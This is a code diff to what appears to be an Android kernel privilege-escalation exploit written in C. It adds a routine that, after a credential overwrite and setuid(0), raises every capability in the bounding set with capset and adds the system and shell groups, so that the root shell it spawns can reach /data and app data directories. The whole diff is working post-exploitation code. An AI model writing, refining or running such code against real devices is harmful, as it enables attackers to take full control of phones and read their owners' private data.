@@ -58,6 +58,8 @@
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/wait.h>
+#include <grp.h>
+#include <linux/capability.h>
 #include <sys/prctl.h>
 #include <sys/resource.h>
 #include <sys/stat.h>
@@ -343,6 +345,55 @@ static void logf(const char *fmt, ...)
     {
         (void)write(g_logfd, buf, (size_t)n);
         (void)fsync(g_logfd);
+    }
+}
+
+/*
+ * The zero-write clears uid/gid only; cap_effective stays empty and Android's
+ * SECURE_NOROOT keeps the exec from restoring it.  Raise every capability the
+ * bounding set allows (on the shell domain that is SETGID/SETUID/SYS_NICE, no
+ * DAC_OVERRIDE) and pick up the system and shell groups, which is what makes
+ * /data, /data/data and /data/local/tmp reachable again.
+ */
+static void raise_caps_and_groups(void)
+{
+    unsigned long long bnd = 0;
+    char line[256];
+    FILE *f;
+
+    f = fopen("/proc/self/status", "r");
+    if (f)
+    {
+        while (fgets(line, sizeof(line), f))
+            if (!strncmp(line, "CapBnd:", 7))
+            {
+                bnd = strtoull(line + 7, NULL, 16);
+                break;
+            }
+        fclose(f);
+    }
+    if (bnd)
+    {
+        struct __user_cap_header_struct hdr = {_LINUX_CAPABILITY_VERSION_3, 0};
+        struct __user_cap_data_struct cd[2] = {{0}};
+
+        cd[0].permitted = cd[0].effective = (unsigned)bnd;
+        cd[1].permitted = cd[1].effective = (unsigned)(bnd >> 32);
+        if (capset(&hdr, cd) != 0)
+            logf("[-] capset errno=%d\n", errno);
+    }
+    {
+        gid_t gl[64];
+        int gn = getgroups(64, gl);
+
+        if (gn < 0)
+            gn = 0;
+        if (gn > 60)
+            gn = 60;
+        gl[gn++] = 1000;
+        gl[gn++] = 2000;
+        if (setgroups((size_t)gn, gl) != 0)
+            logf("[-] setgroups errno=%d\n", errno);
     }
 }
 
@@ -2242,6 +2293,9 @@ static int wait_child_main(const char *mode)
         logf("[-] setuid(0) failed; not running a shell\n");
         _exit(4);
     }
+
+    if (!strcmp(mode, "shell"))
+        raise_caps_and_groups();
 
     {
         char *const envp[] = {
